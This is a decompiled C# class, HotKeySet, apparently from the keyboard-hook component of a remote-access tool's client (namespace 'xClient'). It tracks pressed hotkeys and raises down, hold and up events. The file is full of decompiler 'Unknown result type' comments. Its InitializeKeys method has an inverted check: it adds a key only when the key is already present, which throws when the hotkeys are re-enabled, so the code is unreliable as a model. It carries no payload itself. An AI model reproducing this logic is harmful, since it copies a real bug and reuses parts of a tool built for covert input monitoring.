using System;
using System.Collections.Generic;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.Implementation;

namespace xClient.Core.MouseKeyHook.HotKeys;

public class HotKeySet
{
	public delegate void HotKeyHandler(object sender, HotKeyArgs e);

	private readonly IEnumerable<Keys> m_hotkeys;

	private readonly Dictionary<Keys, bool> m_hotkeystate;

	private readonly Dictionary<Keys, Keys> m_remapping;

	private bool m_enabled = true;

	private int m_hotkeydowncount;

	private int m_remappingCount;

	public string Name { get; set; }

	public string Description { get; set; }

	public IEnumerable<Keys> HotKeys => m_hotkeys;

	public bool HotKeysActivated => m_hotkeydowncount == m_hotkeystate.Count - m_remappingCount;

	public bool Enabled
	{
		get
		{
			return m_enabled;
		}
		set
		{
			if (value)
			{
				InitializeKeys();
			}
			m_enabled = value;
		}
	}

	public event HotKeyHandler OnHotKeysDownHold;

	public event HotKeyHandler OnHotKeysUp;

	public event HotKeyHandler OnHotKeysDownOnce;

	public HotKeySet(IEnumerable<Keys> hotkeys)
	{
		m_hotkeystate = new Dictionary<Keys, bool>();
		m_remapping = new Dictionary<Keys, Keys>();
		m_hotkeys = hotkeys;
		InitializeKeys();
	}

	private void InvokeHotKeyHandler(HotKeyHandler hotKeyDelegate)
	{
		hotKeyDelegate?.Invoke(this, new HotKeyArgs(DateTime.Now));
	}

	private void InitializeKeys()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		foreach (Keys hotKey in HotKeys)
		{
			if (m_hotkeystate.ContainsKey(hotKey))
			{
				m_hotkeystate.Add(hotKey, value: false);
			}
			m_hotkeystate[hotKey] = KeyboardState.GetCurrent().IsDown(hotKey);
		}
	}

	public bool UnregisterExclusiveOrKey(Keys anyKeyInTheExclusiveOrSet)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		Keys exclusiveOrPrimaryKey = GetExclusiveOrPrimaryKey(anyKeyInTheExclusiveOrSet);
		if ((int)exclusiveOrPrimaryKey != 0 && m_remapping.ContainsValue(exclusiveOrPrimaryKey))
		{
			List<Keys> list = new List<Keys>();
			foreach (KeyValuePair<Keys, Keys> item in m_remapping)
			{
				if (item.Value == exclusiveOrPrimaryKey)
				{
					list.Add(item.Key);
				}
			}
			foreach (Keys item2 in list)
			{
				m_remapping.Remove(item2);
			}
			m_remappingCount--;
			return true;
		}
		return false;
	}

	public Keys RegisterExclusiveOrKey(IEnumerable<Keys> orKeySet)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		foreach (Keys item in orKeySet)
		{
			if (!m_hotkeystate.ContainsKey(item))
			{
				return (Keys)0;
			}
		}
		int num = 0;
		Keys val = (Keys)0;
		foreach (Keys item2 in orKeySet)
		{
			if (num == 0)
			{
				val = item2;
			}
			m_remapping[item2] = val;
			num++;
		}
		m_remappingCount++;
		return val;
	}

	private Keys GetExclusiveOrPrimaryKey(Keys k)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		if (!m_remapping.ContainsKey(k))
		{
			return (Keys)0;
		}
		return m_remapping[k];
	}

	private Keys GetPrimaryKey(Keys k)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		if (!m_remapping.ContainsKey(k))
		{
			return k;
		}
		return m_remapping[k];
	}

	internal void OnKey(KeyEventArgsExt kex)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		if (Enabled)
		{
			Keys primaryKey = GetPrimaryKey(((KeyEventArgs)kex).get_KeyCode());
			if (kex.IsKeyDown)
			{
				OnKeyDown(primaryKey);
			}
			else
			{
				OnKeyUp(primaryKey);
			}
		}
	}

	private void OnKeyDown(Keys k)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		if (HotKeysActivated)
		{
			InvokeHotKeyHandler(this.OnHotKeysDownHold);
		}
		else if (m_hotkeystate.ContainsKey(k) && !m_hotkeystate[k])
		{
			m_hotkeystate[k] = true;
			m_hotkeydowncount++;
			if (HotKeysActivated)
			{
				InvokeHotKeyHandler(this.OnHotKeysDownOnce);
			}
		}
	}

	private void OnKeyUp(Keys k)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		if (m_hotkeystate.ContainsKey(k) && m_hotkeystate[k])
		{
			bool hotKeysActivated = HotKeysActivated;
			m_hotkeystate[k] = false;
			m_hotkeydowncount--;
			if (hotKeysActivated)
			{
				InvokeHotKeyHandler(this.OnHotKeysUp);
			}
		}
	}
}
